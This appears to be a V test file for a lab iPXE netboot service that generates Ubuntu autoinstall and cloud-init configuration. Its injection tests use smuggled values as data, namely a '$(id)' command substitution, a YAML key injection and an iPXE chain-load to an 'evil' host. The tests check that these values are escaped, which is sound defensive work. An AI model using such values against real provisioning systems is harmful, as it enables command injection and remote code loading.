module ubuntu

import internal.boot
import os
import internal.lib.sha512crypt
import time

fn sample_req() boot.BootRequest {
	return boot.BootRequest{
		base_url:        'http://192.168.250.10:4793'
		mac:             'BC:24:11:00:24:99'
		mac_key:         'bc2411002499'
		hostname:        'vm-test'
		username:        'timi'
		password_hash:   ''
		ssh_keys:        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey timi@workstation\nssh-rsa AAAAB3Nza example2'
		nfs_root:        '192.168.250.4:/srv/nfs/ubuntu-24.04.5'
		os_name:         'ubuntu'
		os_version:      '24.04.5'
		arch:            'amd64'
		storage_layout:  .zfs
		storage_disk:    ''
		install_count:   0
		boot_mode:       .nfs
		keep_ipxe_first: true
	}
}

fn test_nfs_install_script() {
	u := new(new_assets('/nonexistent-cache', '', '', false))
	s := u.install_script(sample_req())!
	assert s.starts_with('#!ipxe')
	assert s.contains('kernel http://192.168.250.10:4793/assets/ubuntu/24.04.5/vmlinuz')
	assert s.contains('root=/dev/ram0 ramdisk_size=3500000 boot=casper')
	assert s.contains('netboot=nfs nfsroot=192.168.250.4:/srv/nfs/ubuntu-24.04.5')
	assert s.contains('ip=dhcp autoinstall')
	assert s.contains('ds=nocloud-net;s=http://192.168.250.10:4793/os/ubuntu/24.04.5/BC:24:11:00:24:99/')
	assert s.contains('cloud-config-url=/dev/null')
	assert s.contains('initrd http://192.168.250.10:4793/assets/ubuntu/24.04.5/initrd')
	assert s.ends_with('boot\n')
	// the kernel line must not carry initrd=
	kernel_lines := s.split_into_lines().filter(it.starts_with('kernel'))
	assert kernel_lines.len == 1
	assert !kernel_lines[0].contains('initrd=')
}

fn test_http_mode_not_implemented() {
	u := new(new_assets('/nonexistent-cache', '', '', false))
	mut req := sample_req()
	req.boot_mode = .http
	u.install_script(req) or {
		assert err.msg().contains('not implemented')
		return
	}
	assert false, 'http mode must not be implemented in the MVP'
}

fn test_user_data_zfs_defaults() {
	ud := render_user_data(sample_req())
	assert ud.starts_with('#cloud-config\n')
	assert ud.contains('    hostname: "vm-test"')
	assert ud.contains('    username: "timi"')
	assert ud.contains('    password: "${fallback_password_hash}"')
	assert ud.contains('Acquire::ForceIPv4 "true";')
	assert ud.contains('    disable_suites: [security]')
	assert ud.contains('sources.list.d/ubuntu.sources')
	assert ud.contains('      name: zfs')
	assert ud.contains('      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey timi@workstation"')
	assert ud.contains('      - "ssh-rsa AAAAB3Nza example2"')
	assert ud.contains('zfs_arc_max=536870912')
	assert ud.contains('zfs_arc_min=134217728')
	assert ud.contains('update-initramfs -u')
	assert ud.contains('curtin in-target -- sh -c')
	assert ud.contains('efibootmgr -o')
	assert ud.contains('timi ALL=(ALL) NOPASSWD:ALL')
	assert ud.contains('/etc/sudoers.d/90-lab-nopasswd')
	assert ud.contains('systemctl enable qemu-guest-agent')
	assert ud.contains('mac=BC:24:11:00:24:99&hostname=vm-test')
	assert ud.contains('http://192.168.250.10:4793/api/machines/installed')
}

fn test_user_data_keep_ipxe_first_disabled() {
	mut req := sample_req()
	req.keep_ipxe_first = false
	ud := render_user_data(req)
	assert !ud.contains('efibootmgr -o')
}

fn test_user_data_custom_password_direct_layout_no_keys() {
	mut req := sample_req()
	req.password_hash = '$6$abc$def'
	req.storage_layout = .direct
	req.ssh_keys = ''
	ud := render_user_data(req)
	assert ud.contains('    password: "$6$abc$def"')
	assert ud.contains('      name: direct')
	assert ud.contains('timi ALL=(ALL) NOPASSWD:ALL')
	assert !ud.contains('zfs_arc_max')
	assert !ud.contains('authorized-keys')
}

fn test_user_data_storage_disk_match() {
	// no disk selected -> no match block (installer picks the largest disk)
	assert !render_user_data(sample_req()).contains('match:')
	mut req := sample_req()
	req.storage_disk = '/dev/nvme1n1'
	ud := render_user_data(req)
	assert ud.contains('      match:')
	assert ud.contains('        path: "/dev/nvme1n1"')
}

fn test_user_data_escapes_injection() {
	mut req := sample_req()
	req.hostname = 'vm-test\n  malicious-key: 1'
	req.username = "timi'$(id)"
	ud := render_user_data(req)
	// the injected newline stays inside the JSON-escaped double-quoted scalar
	assert ud.contains('hostname: "vm-test\\n  malicious-key: 1"')
	assert !ud.contains('\n  malicious-key:')
	// the sudoers late-command shell-escapes the single quote
	assert ud.contains("printf 'timi'\\''$(id) ALL=(ALL) NOPASSWD:ALL")
	// the phone-home payload URL-encodes the hostname
	assert ud.contains('hostname=vm-test%0A')
	assert !ud.contains('hostname=vm-test\n')
}

fn test_nfs_install_script_sanitizes_hostname() {
	u := new(new_assets('/nonexistent-cache', '', '', false))
	mut req := sample_req()
	req.hostname = 'vm\nchain http://evil/script.ipxe'
	s := u.install_script(req)!
	lines := s.split_into_lines()
	assert lines.len == 5
	assert lines[1] == 'echo lab-v-ipxe: installing vm-chain-http---evil-script.ipxe (ubuntu 24.04.5, NFS mode)'
	assert !s.contains('\nchain http')
}

fn test_meta_data() {
	md := render_meta_data(sample_req())
	assert md.contains('instance-id: i-bc2411002499-0')
	assert md.contains('local-hostname: "vm-test"')
	mut req := sample_req()
	req.install_count = 3
	assert render_meta_data(req).contains('instance-id: i-bc2411002499-3')
}

fn test_fallback_hash_is_sha512crypt_of_ubuntu() {
	h := sha512crypt.hash('ubuntu', 'ipxeDefaultSalt0', 5000)
	assert h == fallback_password_hash
}

fn test_assets_ready_and_path_for() {
	am := new_assets('/nonexistent-cache', '', '', false)
	assert !am.ready('24.04')
	assert am.path_for('24.04', 'vmlinuz') == none
}

fn test_versions_newest_first_and_supports_point_releases() {
	u := new(new_assets('/nonexistent-cache', '', '', false))
	assert u.versions() == ['26.04.1', '24.04.5']
	assert u.supports_version('26.04.1')
	assert u.supports_version('24.04.5')
	assert u.supports_version('26.04.2')
	assert u.supports_version('24.04.6')
	assert !u.supports_version('26.04')
	assert !u.supports_version('24.04')
	assert !u.supports_version('26.05')
	assert !u.supports_version('99.99')
	assert !u.supports_version('26.04.1.2')
}

fn test_nfs_install_script_pinned_version() {
	u := new(new_assets('/nonexistent-cache', '', '', false))
	mut req := sample_req()
	req.os_version = '26.04.1'
	req.nfs_root = '192.168.250.4:/srv/nfs/ubuntu-26.04.1'
	s := u.install_script(req)!
	assert s.contains('kernel http://192.168.250.10:4793/assets/ubuntu/26.04.1/vmlinuz')
	assert s.contains('netboot=nfs nfsroot=192.168.250.4:/srv/nfs/ubuntu-26.04.1')
	assert s.contains('initrd http://192.168.250.10:4793/assets/ubuntu/26.04.1/initrd')
}

fn test_pick_iso_filename() {
	html := '<a href="ubuntu-24.04.2-live-server-amd64.iso">x</a>\n<a href="ubuntu-24.04.3-live-server-amd64.iso">y</a>\n<a href="ubuntu-24.04-live-server-amd64.iso">z</a>\n<a href="ubuntu-24.04.5-live-server-amd64.iso">p</a>\n<a href="ubuntu-24.04.10-live-server-amd64.iso">w</a>\n<a href="ubuntu-24.04.10-live-server-amd64.iso.torrent">t</a>\n<a href="ubuntu-26.04.1-live-server-amd64.iso">u</a>'
	// series: newest .N wins
	got_2404 := pick_iso_filename(html, '24.04') or { '' }
	assert got_2404 == 'ubuntu-24.04.10-live-server-amd64.iso'
	got_2604 := pick_iso_filename(html, '26.04') or { '' }
	assert got_2604 == 'ubuntu-26.04.1-live-server-amd64.iso'
	// pinned: exact file only, never a newer .N
	pinned_2404 := pick_iso_filename(html, '24.04.5') or { '' }
	assert pinned_2404 == 'ubuntu-24.04.5-live-server-amd64.iso'
	pinned_2604 := pick_iso_filename(html, '26.04.1') or { '' }
	assert pinned_2604 == 'ubuntu-26.04.1-live-server-amd64.iso'
	assert pick_iso_filename(html, '26.04.2') == none
	assert pick_iso_filename('nothing here', '24.04') == none
}

fn test_asset_status_is_per_version() {
	am := new_assets('/nonexistent-cache', '', '', false)
	am.set_status(.downloading, '26.04', 'downloading x')
	assert am.status_snapshot('26.04').phase == .downloading
	assert am.status_snapshot('26.04').version == '26.04'
	assert am.status_snapshot('24.04').phase == .idle
	assert am.status_snapshot('24.04').version == '24.04'
	am.set_progress('26.04', 50, 100)
	assert am.status_snapshot('26.04').percent == 50
	assert am.status_snapshot('24.04').percent == 0
}

fn test_ensure_assets_ready_via_override() {
	tmp := os.join_path(os.vtmp_dir(), 'labvipxe_assets_${os.getpid()}')
	os.mkdir_all(tmp)!
	defer {
		os.rmdir_all(tmp) or {}
	}
	os.write_file(os.join_path(tmp, 'vmlinuz'), 'kernel-bytes')!
	os.write_file(os.join_path(tmp, 'initrd'), 'initrd-bytes')!
	am := new_assets(os.join_path(tmp, 'cache'), tmp, '', false)
	assert am.ready('24.04')
	am.ensure_assets('24.04')
	assert am.status_snapshot('24.04').phase == .ready
}

fn test_extractor_detection_lists_at_least_one_on_dev_machine() {
	tools := available_extractors()
	assert tools.len > 0
}

fn tmp_dir_for(name string) string {
	tmp := os.join_path(os.vtmp_dir(), 'labvipxe_${name}_${os.getpid()}')
	os.rmdir_all(tmp) or {}
	os.mkdir_all(tmp) or {}
	return tmp
}

fn test_sha256_of_file_matches_known_vector() {
	tmp := tmp_dir_for('sha256')
	defer {
		os.rmdir_all(tmp) or {}
	}
	path := os.join_path(tmp, 'abc.txt')
	os.write_file(path, 'abc')!
	assert sha256_of_file(path)! == 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad'
}

fn test_parse_sha256sums() {
	body := 'c74833a55e525b1e99e1541509c566bb3e32bdb53bf27ea3347174364a57f47c *ubuntu-24.04.3-live-server-amd64.iso\n97f3d7ffb032c3eb3b23d2c8be9cc76e60c2c1f2c0146ba5ba9fe01cafae0fd8 *ubuntu-24.04.5-live-server-amd64.iso\ndeadbeef *short-hash.iso\n'
	want := '97f3d7ffb032c3eb3b23d2c8be9cc76e60c2c1f2c0146ba5ba9fe01cafae0fd8'
	assert parse_sha256sums(body, 'ubuntu-24.04.5-live-server-amd64.iso') or { '' } == want
	assert parse_sha256sums(body, 'ubuntu-24.04.4-live-server-amd64.iso') == none
	// a line whose digest is not 64 hex chars is ignored
	assert parse_sha256sums(body, 'short-hash.iso') == none
	assert parse_sha256sums('', 'anything.iso') == none
}

fn test_ensure_assets_claim_blocks_double_spawn() {
	tmp := tmp_dir_for('claim')
	defer {
		os.rmdir_all(tmp) or {}
	}
	// a local ISO that cannot be extracted makes the worker fail fast without
	// any network access
	am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
	am.ensure_assets('24.04')
	am.ensure_assets('24.04') // a second boot request must not spawn a second worker
	mut waited := 0
	for waited < 100 && am.status_snapshot('24.04').phase !in [.failed, .ready] {
		time.sleep(100 * time.millisecond)
		waited++
	}
	st := am.status_snapshot('24.04')
	assert st.phase == .failed
	assert st.attempts == 1
}

fn test_failed_fetch_backoff_and_manual_retry() {
	tmp := tmp_dir_for('backoff')
	defer {
		os.rmdir_all(tmp) or {}
	}
	am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
	am.fail('24.04', 'simulated failure')
	assert am.status_snapshot('24.04').attempts == 1
	// inside the 30s backoff window an automatic retry must not start
	am.ensure_assets('24.04')
	time.sleep(300 * time.millisecond)
	st := am.status_snapshot('24.04')
	assert st.phase == .failed
	assert st.attempts == 1
	// the manual retry bypasses the backoff and runs the worker again
	am.fetch_assets_now('24.04')
	mut waited := 0
	for waited < 100 && am.status_snapshot('24.04').attempts < 2 {
		time.sleep(100 * time.millisecond)
		waited++
	}
	assert am.status_snapshot('24.04').attempts == 2
}

fn test_failed_fetch_attempt_cap_blocks_auto_retry() {
	tmp := tmp_dir_for('attemptcap')
	defer {
		os.rmdir_all(tmp) or {}
	}
	mut am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
	am.fail('24.04', 'one')
	am.fail('24.04', 'two')
	am.fail('24.04', 'three')
	assert am.status_snapshot('24.04').attempts == max_auto_attempts
	// pretend the backoff window has long expired, so only the cap can block
	am.mu.lock()
	mut st := am.statuses['24.04'] or { AssetStatus{ version: '24.04' } }
	st.last_fail_at = 0
	am.statuses['24.04'] = st
	am.mu.unlock()
	am.ensure_assets('24.04')
	time.sleep(300 * time.millisecond)
	st = am.status_snapshot('24.04')
	assert st.phase == .failed
	assert st.attempts == max_auto_attempts
}

fn test_failed_fetch_auto_retry_after_backoff() {
	tmp := tmp_dir_for('retry')
	defer {
		os.rmdir_all(tmp) or {}
	}
	mut am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
	am.fail('24.04', 'transient failure')
	// pretend the backoff window already elapsed
	am.mu.lock()
	mut st := am.statuses['24.04'] or { AssetStatus{ version: '24.04' } }
	st.last_fail_at = 0
	am.statuses['24.04'] = st
	am.mu.unlock()
	am.ensure_assets('24.04')
	mut waited := 0
	for waited < 100 && am.status_snapshot('24.04').attempts < 2 {
		time.sleep(100 * time.millisecond)
		waited++
	}
	assert am.status_snapshot('24.04').attempts == 2
}
